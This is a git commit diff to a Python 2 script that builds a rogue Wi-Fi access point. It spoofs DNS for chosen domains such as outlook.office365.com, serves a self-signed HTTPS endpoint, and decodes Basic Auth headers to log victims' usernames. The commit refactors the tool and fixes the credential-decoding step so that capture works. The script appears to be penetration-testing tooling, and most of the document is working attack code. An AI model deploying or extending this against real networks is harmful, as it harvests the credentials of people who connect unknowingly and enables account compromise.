d2bcd817f0a919517120f9d995046703e9311327
breakfix <37887458+breakfix@users.noreply.github.com>
2018-06-28 16:25:06 +1000

    Update untitled.py

--- untitled/untitled.py
+++ untitled/untitled.py
@@ -1,6 +1,7 @@
 from argparse import ArgumentParser
 from time import sleep
 import subprocess
+from subprocess import Popen, PIPE, STDOUT
 import signal
 import os
 import threading
@@ -15,6 +16,8 @@ import SocketServer
 clients = []
 macs = []
 CERTFILE_PATH = "./cert.pem"
+hostapd = ""
+dnsmasq = ""
 
 class AuthHandler(SimpleHTTPRequestHandler):
 
@@ -28,10 +31,12 @@ class AuthHandler(SimpleHTTPRequestHandler):
         print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
         print "\t Host: " + str(self.headers.getheader('Host'))
 
-        if self.headers.getheader('Authorization').split(' ')[1] is not None:
-            creds_decode = base64.b64decode(creds)
-            print "\t Username: " + creds_decode.split(":")[0]
-            #print "\t Password: " + creds_decode.split(":")[1]
+        basic_auth = self.headers.getheader('Authorization')
+
+        if basic_auth is not None:
+            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
+            print "\t Username: " + auth_decode.split(":")[0]
+            #print "\t Password: " + auth_decode.split(":")[1]
             print "\t Password: ***********"
 
         blacklist_mac(ip_to_mac(self.client_address[0]))
@@ -46,10 +51,12 @@ class AuthHandler(SimpleHTTPRequestHandler):
         print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
         print "\t Host: " + str(self.headers.getheader('Host'))
 
-        if self.headers.getheader('Authorization').split(' ')[1] is not None:
-            creds_decode = base64.b64decode(creds)
-            print "\t Username: " + creds_decode.split(":")[0]
-            #print "\t Password: " + creds_decode.split(":")[1]
+        basic_auth = self.headers.getheader('Authorization')
+
+        if basic_auth is not None:
+            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
+            print "\t Username: " + auth_decode.split(":")[0]
+            #print "\t Password: " + auth_decode.split(":")[1]
             print "\t Password: ***********"
 
         blacklist_mac(ip_to_mac(self.client_address[0]))
@@ -64,10 +71,12 @@ class AuthHandler(SimpleHTTPRequestHandler):
         print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
         print "\t Host: " + str(self.headers.getheader('Host'))
 
-        if self.headers.getheader('Authorization').split(' ')[1] is not None:
-            creds_decode = base64.b64decode(creds)
-            print "\t Username: " + creds_decode.split(":")[0]
-            #print "\t Password: " + creds_decode.split(":")[1]
+        basic_auth = self.headers.getheader('Authorization')
+
+        if basic_auth is not None:
+            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
+            print "\t Username: " + auth_decode.split(":")[0]
+            #print "\t Password: " + auth_decode.split(":")[1]
             print "\t Password: ***********"
 
         blacklist_mac(ip_to_mac(self.client_address[0]))
@@ -82,10 +91,12 @@ class AuthHandler(SimpleHTTPRequestHandler):
         print "\t User-Agent: " + str(self.headers.getheader('User-Agent'))
         print "\t Host: " + str(self.headers.getheader('Host'))
 
-        if self.headers.getheader('Authorization').split(' ')[1] is not None:
-            creds_decode = base64.b64decode(creds)
-            print "\t Username: " + creds_decode.split(":")[0]
-            #print "\t Password: " + creds_decode.split(":")[1]
+        basic_auth = self.headers.getheader('Authorization')
+
+        if basic_auth is not None:
+            auth_decode = base64.b64decode(basic_auth.split(' ')[1])
+            print "\t Username: " + auth_decode.split(":")[0]
+            #print "\t Password: " + auth_decode.split(":")[1]
             print "\t Password: ***********"
 
         blacklist_mac(ip_to_mac(self.client_address[0]))
@@ -99,7 +110,7 @@ def serve_https(HandlerClass = AuthHandler,
     print "[+] Serving HTTPS on", sa[0], "port", sa[1]
     httpd.serve_forever()
 
-def generate_hostapd_conf():
+def generate_hostapd_conf(args):
     with open("hostapd.conf", "w") as file:
         file.write("interface=" + str(args.interface) + "\n")
         file.write("channel=1\n")
@@ -109,12 +120,12 @@ def generate_hostapd_conf():
         file.write("macaddr_acl=1\n")
         file.write("accept_mac_file=" + str(os.getcwd()) + "/" + str(args.maclist) + "\n")
 
-def generate_dnsmasq_hosts():
+def generate_dnsmasq_hosts(args):
     with open("dnsmasq.hosts", "w") as file:
         for entry in str(args.domain).split(','):
             file.write("10.0.0.1  " + str(entry + "\n"))
 
-def generate_dnsmasq_conf():
+def generate_dnsmasq_conf(args):
     with open("dnsmasq.conf", "w") as file:
         file.write("interface=" + str(args.interface) + "\n")
         file.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
@@ -123,8 +134,11 @@ def generate_dnsmasq_conf():
         file.write("server=8.8.8.8\n")
         file.write("log-queries\n")
         file.write("log-dhcp\n")
+        file.write("addn-hosts=" + str(os.getcwd()) + "/dnsmasq.hosts" + "\n")
+        file.write("dhcp-leasefile=" + str(os.getcwd()) + "/dhcp.leases" + "\n")
+        file.write("log-facility=" + str(os.getcwd()) + "/dnsmasq.log" + "\n")
 
-def generate_ssl_conf():
+def generate_ssl_conf(args):
     with open("ssl.conf", "w") as file:
         file.write("[req]\n")
         file.write("prompt = no\n")
@@ -143,13 +157,36 @@ def generate_ssl_conf():
         file.write("keyUsage = nonRepudiation, digitalSignature, keyEncipherment\n")
 
 def connected_clients():
-    with open("dhcp.leases", "r") as file:
-        for line in file.readlines():
-            if (line.split()[1]) not in macs:
-                macs.append(line.split()[1])
-                clients.append({'MAC':line.split()[1],'IP':line.split()[2],'hostname':line.split()[3]})
-                print "[+] Client connected " + str(line.split()[1]) + " " + str(line.split()[2]) + " " + str(line.split()[3])
-                sleep(5)
+    while True:
+        if os.path.exists("./dhcp.leases"):
+            with open("./dhcp.leases", "r") as file:
+                for line in file.readlines():
+                    if (line.split()[1]) not in macs:
+                        macs.append(line.split()[1])
+                        clients.append({'MAC':line.split()[1],'IP':line.split()[2],'hostname':line.split()[3]})
+                        print "[+] Client connected " + str(line.split()[1]) + " " + str(line.split()[2]) + " " + str(line.split()[3])
+
+def hostapd_check_log():
+    ''' hostapd runs as a daemon but occasionally fails to start
+    the wireless interface. When this happens the hostapd
+    process continues to run but the access point will fail.
+
+    Exit status is never set as the process is still running.
+
+    Work around is to check log file for errors starting the
+    wireless interface and exit the main thread if it encounters them
+    '''
+    while True:
+        if os.path.exists("./hostapd.log"):
+            with open("./hostapd.log", "r") as file:
+                for line in file.readlines():
+                    if ("No such device" in line or
+                        "Unable to setup interface" in line or
+                        "wasn't started" in line):
+
+                        print "[!] Hostapd failed to start. Check 'hostapd.log' for details"
+                        # Exit out of our script not just our forked process
+                        os._exit(1)
 
 def blacklist_mac(mac):
     with open("hostapd.allow", "r") as file:
@@ -181,77 +218,97 @@ def ip_to_hostname(ip):
             print "[!] Could not find hostname for IP:" + ip
             return "null"
 
-parser = ArgumentParser()
-parser.add_argument("-i", "--interface", dest="interface", required=True,
-                    help="Wireless interface for access point (should not be managed by Network Manager)")
+def generate_ssl_cert():
 
-parser.add_argument("-s", "--ssid", dest="ssid", required=True,
-                    help="SSID for access point (max one atm)")
+    if os.path.isfile("./cert.pem"):
+        print "[+] Using existing SSL certificate 'cert.pem'"
+    else:
+        print "[!] No SSL certificate found, generating one..."
+        cmd = ["/usr/bin/openssl", "req", "-new", "-x509", "-nodes", "-days", "365", "-config", str(os.getcwd()) + "/ssl.conf", "-keyout", "cert.pem", "-out", "cert.pem"]
+        try:
+            openssl = subprocess.Popen(cmd)
+            openssl.wait()
+        except subprocess.CalledProcessError as e:
+            print "[!] Error returned while starting openssl. Exiting"
+            print e.output
+            exit()
 
-parser.add_argument("-c", "--channel", dest="channel",
-                    help="Wireless channel for access point")
+def start_dnsmasq():
 
-parser.add_argument("-m", "--maclist", dest="maclist", required=True,
-                    help="File containing allowed MAC addresses to connect (one per line)")
+    print "[+] Starting dnsmasq..."
+    # -k = Do not run as daemon
+    cmd = ["/usr/sbin/dnsmasq", "-k", "-C", str(os.getcwd()) + "/dnsmasq.conf"]
 
-parser.add_argument("-d", "--domain", dest="domain", required=True,
-                    help="Domain name to target (specify a comma separated list for mulitple names e.g 'outlook.office365.com,mail.company.com')")
+    # mad hacks again
+    global dnsmasq
+    dnsmasq = subprocess.Popen(cmd, stdout=None, stderr=subprocess.STDOUT)
 
-args = parser.parse_args()
+def start_hostapd():
 
-generate_hostapd_conf()
-generate_dnsmasq_conf()
-generate_dnsmasq_hosts()
-generate_ssl_conf()
-
-#os.system("ifconfig " + str(args.interface) + " down")
-
-if os.path.isfile("./cert.pem"):
-    print "[+] Using existing SSL certificate"
-else:
-    print "[!] No SSL certificate found, generating one..."
-    cmd = ["/usr/bin/openssl", "req", "-new", "-x509", "-nodes", "-days", "365", "-config", str(os.getcwd()) + "/ssl.conf", "-keyout", "cert.pem", "-out", "cert.pem"]
-    try:
-        openssl = subprocess.Popen(cmd)
-        openssl.wait()
-    except subprocess.CalledProcessError as e:
-        print "[!] Error returned while starting openssl. Exiting"
-        print e.output
-        exit()
-
-with open("dnsmasq.log", 'w') as outfile:
-    try:
-        print "[+] Starting dnsmasq..."
-        cmd = ["/usr/sbin/dnsmasq", "--addn-hosts=" + str(os.getcwd()) + "/dnsmasq.hosts", "--dhcp-leasefile=" + str(os.getcwd()) + "/dhcp.leases", "-d", "-C", str(os.getcwd()) + "/dnsmasq.conf"]
-        dnsmasq = subprocess.Popen(cmd, stdout=outfile, stderr=subprocess.STDOUT)
-    except subprocess.CalledProcessError as e:
-        print "[!] Error returned while starting dnsmasq. Check log file 'dnsmasq.log' for details. Exiting"
-        print e.output
-        exit()
-
-with open("hostapd.log", 'w') as outfile:
-
-    ''' This is tricky to error catch
-    hostapd runs as a daemon but occasionally fails to start
-    the wireless interface. When this happens the hostapd
-    process continues to run but the access point will fail.
-
-    exit status is never set as the process is still running.
-    '''
     print "[+] Starting hostapd..."
-    cmd = ["/usr/sbin/hostapd", str(os.getcwd()) + "/hostapd.conf"]
-    hostapd = subprocess.Popen(cmd, stdout=outfile, stderr=subprocess.STDOUT)
+    cmd = ["/usr/sbin/hostapd", str(os.getcwd()) + "/hostapd.conf", "-f", "./hostapd.log"]
 
-web_server_thread = threading.Thread(target=serve_https)
-web_server_thread.daemon = True
-web_server_thread.start()
+    # mad hack
+    global hostapd
+    hostapd = subprocess.Popen(cmd, stdout=None, stderr=subprocess.STDOUT)
 
-while True:
+def main():
+
+    parser = ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", required=True,
+                        help="Wireless interface for access point (should not be managed by Network Manager)")
+
+    parser.add_argument("-s", "--ssid", dest="ssid", required=True,
+                        help="SSID for access point (max one SSID for now)")
+
+    parser.add_argument("-c", "--channel", dest="channel",
+                        help="Wireless channel for access point")
+
+    parser.add_argument("-m", "--maclist", dest="maclist", required=True,
+                        help="File containing allowed MAC addresses to connect (one per line)")
+
+    parser.add_argument("-d", "--domain", dest="domain", required=True,
+                        help="Domain name to target (specify a comma separated list for mulitple names e.g 'outlook.office365.com,mail.company.com')")
+
+    args = parser.parse_args()
+
+    # Create our config files
+    generate_hostapd_conf(args)
+    generate_dnsmasq_conf(args)
+    generate_dnsmasq_hosts(args)
+    generate_ssl_cert()
+    generate_ssl_conf(args)
+
+    #os.system("ifconfig " + str(args.interface) + " down")
+
+    start_dnsmasq()
+    start_hostapd()
+
+    web_server_thread = threading.Thread(target=serve_https)
+    web_server_thread.daemon = True
+    web_server_thread.start()
+
+    connected_clients_log_worker = threading.Thread(target=connected_clients)
+    connected_clients_log_worker.daemon = True
+    connected_clients_log_worker.start()
+
+    hostapd_log_worker = threading.Thread(target=hostapd_check_log)
+    hostapd_log_worker.daemon = True
+    hostapd_log_worker.start()
+
+    while True:
+        sleep(1)
+
+if __name__ == "__main__":
     try:
-        connected_clients()
+        main()
     except KeyboardInterrupt:
         print("[+] Interrupt received, stopping...")
         #clean up
         dnsmasq.kill()
+        timestamp = datetime.datetime.now().strftime("_%B_%d_%Y_%I:%M_%p")
+        os.rename("./hostapd.log", "hostapd.log" + timestamp)
+        os.rename("./dhcp.leases", "dhcp.leases" + timestamp)
+        os.rename("./dnsmasq.log", "dnsmasq.log" + timestamp)
         hostapd.kill()
         exit()
